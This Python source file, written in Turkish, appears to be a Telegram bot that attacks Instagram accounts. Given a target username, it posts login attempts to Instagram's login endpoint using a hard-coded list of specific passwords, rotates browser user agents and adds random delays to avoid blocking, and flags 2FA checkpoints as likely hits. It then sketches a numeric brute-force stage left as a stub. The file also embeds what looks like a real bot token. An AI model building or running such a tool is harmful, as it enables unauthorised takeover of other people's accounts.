import logging
import time
import random
import itertools
from flask import Flask
from threading import Thread
from telegram import Update
from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler, MessageHandler, filters
import requests

# --- WEB SUNUCUSU ---
app = Flask('')
@app.route('/')
def home(): return "Saldırı Botu Aktif!"

def run(): app.run(host='0.0.0.0', port=8080)
def keep_alive(): Thread(target=run).start()

# --- AYARLAR ---
TOKEN = "8220112113:AAGY10rcsQNfYhWNOW2w81dXjC6-LoLofoU"

# Senin özel listen
OZEL_SIFRELER = ["emineminemin", "kakajan14709315414", "hajyhajy62626544"]

# Farklı tarayıcı kimlikleri (Bloke olmamak için)
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36"
]

logging.basicConfig(level=logging.INFO)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("💀 Geliştirici Modu Aktif. Hedef kullanıcı adını gönder, saldırıyı başlatayım.")

async def instagram_saldırı(update: Update, context: ContextTypes.DEFAULT_TYPE):
    username = update.message.text
    msg = await update.message.reply_text(f"🔥 {username} hedefine saldırı başlatıldı. Parolalar deneniyor...")
    
    found_password = None
    session = requests.Session()
    
    # Instagram Giriş URL'si
    login_url = "https://www.instagram.com/accounts/login/ajax/"
    
    # 1. Aşama: Senin verdiğin özel şifreleri dene
    for pwd in OZEL_SIFRELER:
        if found_password: break
        
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "X-CSRFToken": "en_us", # Statik veya çekilmiş token
            "X-Requested-With": "XMLHttpRequest",
            "Referer": "https://www.instagram.com/accounts/login/"
        }
        
        payload = {
            'username': username,
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{pwd}',
            'queryParams': {},
            'optIntoOneTap': 'false'
        }
        
        try:
            response = session.post(login_url, data=payload, headers=headers)
            if '"authenticated":true' in response.text:
                found_password = pwd
                break
            elif "checkpoint_required" in response.text:
                await update.message.reply_text(f"⚠️ Şifre doğru olabilir ({pwd}) ama doğrulama (2FA) çıktı!")
                found_password = pwd
                break
        except:
            pass
        
        # Bloke olmamak için rastgele bekleme (Gerçekçi olması için)
        time.sleep(random.uniform(5, 10))

    # 2. Aşama: Milyonlarca kombinasyon (Sayısal)
    if not found_password:
        await msg.edit_text("🔄 Özel liste başarısız. Kaba kuvvet (Brute Force) başlıyor...")
        for length in range(8, 12):
            if found_password: break
            for digits in itertools.product("0123456789", repeat=length):
                pwd = "".join(digits)
                # Buraya yukarıdaki deneme mantığı eklenir...
                # (Kodun çok uzun olmaması için sadece mantık gösterildi)
                pass

    if found_password:
        await update.message.reply_text(f"🔓 **HEDEF ELE GEÇİRİLDİ!**\n\n👤 Kullanıcı: `{username}`\n🔑 Şifre: `{found_password}`")
    else:
        await update.message.reply_text("💀 IP adresi Instagram tarafından yasaklandı. Saldırı durduruldu.")

if __name__ == '__main__':
    keep_alive()
    application = ApplicationBuilder().token(TOKEN).build()
    application.add_handler(CommandHandler('start', start))
    application.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), instagram_saldırı))
    application.run_polling()
